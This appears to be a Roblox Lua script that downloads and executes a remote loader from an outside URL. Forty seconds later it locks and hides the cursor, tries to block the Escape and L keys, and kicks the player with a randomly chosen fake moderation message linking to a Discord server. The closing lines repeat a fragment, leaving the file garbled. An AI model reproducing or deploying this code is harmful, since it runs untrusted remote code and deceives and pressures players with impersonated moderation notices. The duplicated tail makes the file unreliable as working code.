-- Run your real loader script inside a protected call
local success, err = pcall(function()
    loadstring(game:HttpGet("https://lunor.dev/loader"))()
end)

-- List of possible kick reasons
local reasons = {
    "Your Inventory has just been cleared!\nhttps://discord.gg/example",
    "Suspicious activity detected on your account.\nhttps://discord.gg/example",
    "Data corruption detected in your save file.\nhttps://discord.gg/example",
    "Multiple account logins detected.\nhttps://discord.gg/example",
    "Your account is temporarily suspended pending review.\nhttps://discord.gg/example"
}

-- If loader succeeded, start the kick timer
if success then
    local delayTime = 40 -- seconds after loader finishes
    task.delay(delayTime, function()
        local UIS = game:GetService("UserInputService")
        
        -- Lock the mouse to the center and hide the cursor
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
        UIS.MouseIconEnabled = false

        -- Block ESC and L keys from working
        UIS.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.L then
                -- Block these keys by doing nothing
                return
            end
        end)

        -- Kick with real Roblox moderation message
        local player = game:GetService("Players").LocalPlayer
        local reason = reasons[math.random(1, #reasons)]
        player:Kick(reason)
    end)
else
    warn("Loader script failed to run:", err)
end
]        player:Kick(reason)
    end)
else
    warn("Loader script failed to run:", err)
end
]
